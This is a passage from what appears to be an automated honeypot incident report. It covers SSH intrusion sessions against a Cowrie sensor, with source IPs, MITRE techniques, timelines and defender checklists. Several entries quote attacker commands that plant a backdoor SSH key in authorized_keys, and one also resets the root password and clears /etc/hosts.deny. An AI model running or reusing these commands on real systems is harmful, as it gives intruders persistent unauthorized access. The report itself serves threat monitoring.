| `2026-06-08 08:24:09` | `cowrie.log.closed` |
| `2026-06-08 08:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c7e83f89cba

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-06-08 08:26 |
| **Last Seen** | 2026-06-08 08:27 |
| **Session Duration** | 92s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:NhHGBCohCLOR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:26:11` | `cowrie.session.connect` |
| `2026-06-08 08:26:11` | `cowrie.client.version` |
| `2026-06-08 08:26:12` | `cowrie.client.kex` |
| `2026-06-08 08:26:14` | `cowrie.login.success` |
| `2026-06-08 08:26:15` | `cowrie.session.params` |
| `2026-06-08 08:26:15` | `cowrie.command.input` |
| `2026-06-08 08:26:15` | `cowrie.command.failed` |
| `2026-06-08 08:26:17` | `cowrie.log.closed` |
| `2026-06-08 08:26:19` | `cowrie.session.params` |
| `2026-06-08 08:26:19` | `cowrie.command.input` |
| `2026-06-08 08:26:20` | `cowrie.session.file_download` |
| `2026-06-08 08:26:20` | `cowrie.log.closed` |
| `2026-06-08 08:26:36` | `cowrie.session.params` |
| `2026-06-08 08:26:36` | `cowrie.command.input` |
| `2026-06-08 08:26:37` | `cowrie.log.closed` |
| `2026-06-08 08:26:38` | `cowrie.session.params` |
| `2026-06-08 08:26:38` | `cowrie.command.input` |
| `2026-06-08 08:26:42` | `cowrie.log.closed` |
| `2026-06-08 08:26:43` | `cowrie.session.params` |
| `2026-06-08 08:26:43` | `cowrie.command.input` |
| `2026-06-08 08:26:44` | `cowrie.session.file_download` |
| `2026-06-08 08:26:44` | `cowrie.log.closed` |
| `2026-06-08 08:26:45` | `cowrie.session.params` |
| `2026-06-08 08:26:45` | `cowrie.command.input` |
| `2026-06-08 08:26:46` | `cowrie.log.closed` |
| `2026-06-08 08:26:46` | `cowrie.session.params` |
| `2026-06-08 08:26:46` | `cowrie.command.input` |
| `2026-06-08 08:26:48` | `cowrie.log.closed` |
| `2026-06-08 08:26:49` | `cowrie.session.params` |
| `2026-06-08 08:26:49` | `cowrie.command.input` |
| `2026-06-08 08:26:49` | `cowrie.command.input` |
| `2026-06-08 08:26:49` | `cowrie.log.closed` |
| `2026-06-08 08:26:50` | `cowrie.session.params` |
| `2026-06-08 08:26:50` | `cowrie.command.input` |
| `2026-06-08 08:26:51` | `cowrie.log.closed` |
| `2026-06-08 08:26:51` | `cowrie.session.params` |
| `2026-06-08 08:26:51` | `cowrie.command.input` |
| `2026-06-08 08:26:53` | `cowrie.log.closed` |
| `2026-06-08 08:26:54` | `cowrie.session.params` |
| `2026-06-08 08:26:54` | `cowrie.command.input` |
| `2026-06-08 08:26:55` | `cowrie.log.closed` |
| `2026-06-08 08:26:55` | `cowrie.session.params` |
| `2026-06-08 08:26:55` | `cowrie.command.input` |
| `2026-06-08 08:26:56` | `cowrie.log.closed` |
| `2026-06-08 08:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f24880db4186

| Field | Detail |
|---|---|
| **Source IP** | `58.6.206[.]239` |
| **First Seen** | 2026-06-08 08:28 |
| **Last Seen** | 2026-06-08 08:28 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:28:31` | `cowrie.session.connect` |
| `2026-06-08 08:28:31` | `cowrie.client.version` |
| `2026-06-08 08:28:31` | `cowrie.client.kex` |
| `2026-06-08 08:28:34` | `cowrie.login.success` |
| `2026-06-08 08:28:35` | `cowrie.session.params` |
| `2026-06-08 08:28:35` | `cowrie.command.input` |
| `2026-06-08 08:28:35` | `cowrie.command.failed` |
| `2026-06-08 08:28:35` | `cowrie.log.closed` |
| `2026-06-08 08:28:36` | `cowrie.session.params` |
| `2026-06-08 08:28:36` | `cowrie.command.input` |
| `2026-06-08 08:28:37` | `cowrie.session.file_download` |
| `2026-06-08 08:28:37` | `cowrie.log.closed` |
| `2026-06-08 08:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.6.206[.]239` to AbuseIPDB if not already reported
- [ ] Block `58.6.206[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6301f6ffff

| Field | Detail |
|---|---|
| **Source IP** | `58.6.206[.]239` |
| **First Seen** | 2026-06-08 08:28 |
| **Last Seen** | 2026-06-08 08:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:28:42` | `cowrie.session.connect` |
| `2026-06-08 08:28:42` | `cowrie.client.version` |
| `2026-06-08 08:28:42` | `cowrie.client.kex` |
| `2026-06-08 08:28:45` | `cowrie.login.success` |
| `2026-06-08 08:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.6.206[.]239` to AbuseIPDB if not already reported
- [ ] Block `58.6.206[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1647fea9e008

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 08:29 |
| **Last Seen** | 2026-06-08 08:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:29:00` | `cowrie.session.connect` |
| `2026-06-08 08:29:00` | `cowrie.client.version` |
| `2026-06-08 08:29:00` | `cowrie.client.kex` |
| `2026-06-08 08:29:01` | `cowrie.login.success` |
| `2026-06-08 08:29:02` | `cowrie.session.params` |
| `2026-06-08 08:29:02` | `cowrie.command.input` |
| `2026-06-08 08:29:02` | `cowrie.command.failed` |
| `2026-06-08 08:29:02` | `cowrie.log.closed` |
| `2026-06-08 08:29:02` | `cowrie.session.params` |
| `2026-06-08 08:29:02` | `cowrie.command.input` |
| `2026-06-08 08:29:02` | `cowrie.session.file_download` |
| `2026-06-08 08:29:02` | `cowrie.log.closed` |
| `2026-06-08 08:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91ff5c1d2ae0

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 08:29 |
| **Last Seen** | 2026-06-08 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:29:05` | `cowrie.session.connect` |
| `2026-06-08 08:29:05` | `cowrie.client.version` |
| `2026-06-08 08:29:05` | `cowrie.client.kex` |
| `2026-06-08 08:29:06` | `cowrie.login.success` |
| `2026-06-08 08:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a9b5d75122

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:29 |
| **Last Seen** | 2026-06-08 08:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:29:44` | `cowrie.session.connect` |
| `2026-06-08 08:29:44` | `cowrie.client.version` |
| `2026-06-08 08:29:45` | `cowrie.client.kex` |
| `2026-06-08 08:29:46` | `cowrie.login.success` |
| `2026-06-08 08:29:47` | `cowrie.session.params` |
| `2026-06-08 08:29:47` | `cowrie.command.input` |
| `2026-06-08 08:29:47` | `cowrie.command.failed` |
| `2026-06-08 08:29:47` | `cowrie.log.closed` |
| `2026-06-08 08:29:47` | `cowrie.session.params` |
| `2026-06-08 08:29:47` | `cowrie.command.input` |
| `2026-06-08 08:29:48` | `cowrie.session.file_download` |
| `2026-06-08 08:29:48` | `cowrie.log.closed` |
| `2026-06-08 08:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f7558a14c42

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:29 |
| **Last Seen** | 2026-06-08 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:29:51` | `cowrie.session.connect` |
| `2026-06-08 08:29:51` | `cowrie.client.version` |
| `2026-06-08 08:29:51` | `cowrie.client.kex` |
| `2026-06-08 08:29:52` | `cowrie.login.success` |
| `2026-06-08 08:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ca15d95618

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-06-08 08:30 |
| **Last Seen** | 2026-06-08 08:30 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:30:24` | `cowrie.session.connect` |
| `2026-06-08 08:30:26` | `cowrie.client.version` |
| `2026-06-08 08:30:26` | `cowrie.client.kex` |
| `2026-06-08 08:30:29` | `cowrie.login.success` |
| `2026-06-08 08:30:30` | `cowrie.session.params` |
| `2026-06-08 08:30:30` | `cowrie.command.input` |
| `2026-06-08 08:30:30` | `cowrie.command.failed` |
| `2026-06-08 08:30:32` | `cowrie.log.closed` |
| `2026-06-08 08:30:33` | `cowrie.session.params` |
| `2026-06-08 08:30:33` | `cowrie.command.input` |
| `2026-06-08 08:30:33` | `cowrie.session.file_download` |
| `2026-06-08 08:30:33` | `cowrie.log.closed` |
| `2026-06-08 08:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bd46a6c653

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-06-08 08:30 |
| **Last Seen** | 2026-06-08 08:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:30:44` | `cowrie.session.connect` |
| `2026-06-08 08:30:44` | `cowrie.client.version` |
| `2026-06-08 08:30:48` | `cowrie.client.kex` |
| `2026-06-08 08:30:49` | `cowrie.login.success` |
| `2026-06-08 08:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.71.127[.]158` to AbuseIPDB if not already reported
- [ ] Block `95.71.127[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d338be23cf

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 08:31 |
| **Last Seen** | 2026-06-08 08:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:31:05` | `cowrie.session.connect` |
| `2026-06-08 08:31:05` | `cowrie.client.version` |
| `2026-06-08 08:31:05` | `cowrie.client.kex` |
| `2026-06-08 08:31:06` | `cowrie.login.success` |
| `2026-06-08 08:31:07` | `cowrie.session.params` |
| `2026-06-08 08:31:07` | `cowrie.command.input` |
| `2026-06-08 08:31:07` | `cowrie.command.failed` |
| `2026-06-08 08:31:07` | `cowrie.log.closed` |
| `2026-06-08 08:31:07` | `cowrie.session.params` |
| `2026-06-08 08:31:07` | `cowrie.command.input` |
| `2026-06-08 08:31:08` | `cowrie.session.file_download` |
| `2026-06-08 08:31:08` | `cowrie.log.closed` |
| `2026-06-08 08:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9a79a706438

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 08:31 |
| **Last Seen** | 2026-06-08 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:31:10` | `cowrie.session.connect` |
| `2026-06-08 08:31:10` | `cowrie.client.version` |
| `2026-06-08 08:31:10` | `cowrie.client.kex` |
| `2026-06-08 08:31:11` | `cowrie.login.success` |
| `2026-06-08 08:31:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5ac8dcf8c33

| Field | Detail |
|---|---|
| **Source IP** | `58.6.206[.]239` |
| **First Seen** | 2026-06-08 08:32 |
| **Last Seen** | 2026-06-08 08:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:32:04` | `cowrie.session.connect` |
| `2026-06-08 08:32:04` | `cowrie.client.version` |
| `2026-06-08 08:32:04` | `cowrie.client.kex` |
| `2026-06-08 08:32:06` | `cowrie.login.success` |
| `2026-06-08 08:32:06` | `cowrie.session.params` |
| `2026-06-08 08:32:06` | `cowrie.command.input` |
| `2026-06-08 08:32:06` | `cowrie.command.failed` |
| `2026-06-08 08:32:07` | `cowrie.log.closed` |
| `2026-06-08 08:32:08` | `cowrie.session.params` |
| `2026-06-08 08:32:08` | `cowrie.command.input` |
| `2026-06-08 08:32:09` | `cowrie.session.file_download` |
| `2026-06-08 08:32:09` | `cowrie.log.closed` |
| `2026-06-08 08:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.6.206[.]239` to AbuseIPDB if not already reported
- [ ] Block `58.6.206[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1591eb013701

| Field | Detail |
|---|---|
| **Source IP** | `58.6.206[.]239` |
| **First Seen** | 2026-06-08 08:32 |
| **Last Seen** | 2026-06-08 08:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:32:13` | `cowrie.session.connect` |
| `2026-06-08 08:32:13` | `cowrie.client.version` |
| `2026-06-08 08:32:13` | `cowrie.client.kex` |
| `2026-06-08 08:32:15` | `cowrie.login.success` |
| `2026-06-08 08:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.6.206[.]239` to AbuseIPDB if not already reported
- [ ] Block `58.6.206[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36f135db64e

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 08:39 |
| **Last Seen** | 2026-06-08 08:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:39:05` | `cowrie.session.connect` |
| `2026-06-08 08:39:05` | `cowrie.client.version` |
| `2026-06-08 08:39:05` | `cowrie.client.kex` |
| `2026-06-08 08:39:06` | `cowrie.login.success` |
| `2026-06-08 08:39:06` | `cowrie.session.params` |
| `2026-06-08 08:39:06` | `cowrie.command.input` |
| `2026-06-08 08:39:06` | `cowrie.command.failed` |
| `2026-06-08 08:39:07` | `cowrie.log.closed` |
| `2026-06-08 08:39:07` | `cowrie.session.params` |
| `2026-06-08 08:39:07` | `cowrie.command.input` |
| `2026-06-08 08:39:07` | `cowrie.session.file_download` |
| `2026-06-08 08:39:07` | `cowrie.log.closed` |
| `2026-06-08 08:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be572f49ce1d

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 08:39 |
| **Last Seen** | 2026-06-08 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:39:09` | `cowrie.session.connect` |
| `2026-06-08 08:39:09` | `cowrie.client.version` |
| `2026-06-08 08:39:10` | `cowrie.client.kex` |
| `2026-06-08 08:39:10` | `cowrie.login.success` |
| `2026-06-08 08:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
